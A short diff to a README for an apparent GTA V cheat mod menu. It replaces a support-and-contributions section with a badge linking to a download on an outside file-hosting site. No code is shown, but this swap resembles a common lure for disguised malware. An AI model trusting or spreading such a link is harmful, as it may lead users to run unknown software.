@@ -16,5 +16,4 @@
 3. Open the menu using the designated keybind and explore various customization options.
 4. Activate your desired cheats and enjoy an enhanced gaming experience!
 
-## 🔗 Support and Contributions:
-If you encounter any issues or have suggestions for new features, feel free to open an issue or submit a pull request. Contributions from the community are always welcome!
+[![Download Gta V Mod Menu](https://img.shields.io/badge/Download-GtaV%20ModMenu-blueviolet)](https://downeefiles.com/s/gtvmmenu)
